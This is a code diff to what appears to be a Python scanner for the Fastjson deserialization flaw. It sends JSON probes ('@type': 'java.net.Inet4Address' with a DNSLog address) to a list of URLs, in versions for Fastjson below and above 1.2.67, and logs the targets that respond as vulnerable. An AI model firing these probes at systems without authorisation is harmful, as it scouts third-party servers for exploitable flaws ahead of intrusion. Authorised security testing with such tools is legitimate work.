@@ -42,31 +42,54 @@ def judgeArm(list,dns_log):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
     }
-    data = {
-        "tommonkey": {
+
+    # standard_package to send
+    standard_data = {
+        "examples": "fack you"
+    }
+
+    # Payload1:version<1.2.67
+    data1 = {
+        "giao": {
             "@type": "java.net.Inet4Address",
-            "val": dns_log
+            "val": dns_log,
         }
     }
+
+    # Payload2:version>1.2.67
+    data2 = {
+            "@type": "java.net.Inet4Address",
+            "val": dns_log,
+        }
+
     time.sleep(0.5)
-    type_json = json.dumps(data)        # change type of data
+    type1_json = json.dumps(data1)        # change type of data
+    type2_json = json.dumps(data2)
 
     with open(r"./result.txt","a+",encoding="utf-8") as w:
         print(list)
         for url in list:
-            print("Detecting {}...please keep patience!".format(url))
+            # print("Detecting {}...please keep patience!".format(url))
             try:
-                msg = requests.post(url, headers=headers,data=type_json)
-                msg.keep_live = False
-                print("response package:{}".format(msg.content))
-                if msg.status_code == 200:
-                    print('''\033[5;31;44mMaybe exist vul\033[0m''')
+                standard_msg = requests.post(url,headers=headers,data=standard_data)
+                msg1 = requests.post(url, headers=headers,data=type1_json)
+                msg1.keep_live = False
+                msg2 = requests.post(url, headers=headers, data=type2_json)
+                msg2.keep_live = False
+
+
+                if msg1.status_code == 200 and standard_msg.content != msg1.content:
+                    print('''\033[5;31;44m[+]{} Maybe exist vul\033[0m'''.format(url))
+                    w.write(url+"\n")
+                elif msg2.status_code == 200 and standard_msg.content != msg2.content:
+                    print('''\033[5;31;44m[+]{} Maybe exist vul\033[0m'''.format(url))
                     w.write(url+"\n")
                 else:
                     print("{} daesn't exist leak".format(url))
 
             except Exception as err:
                 print(err)
+                # pass
 
 
 
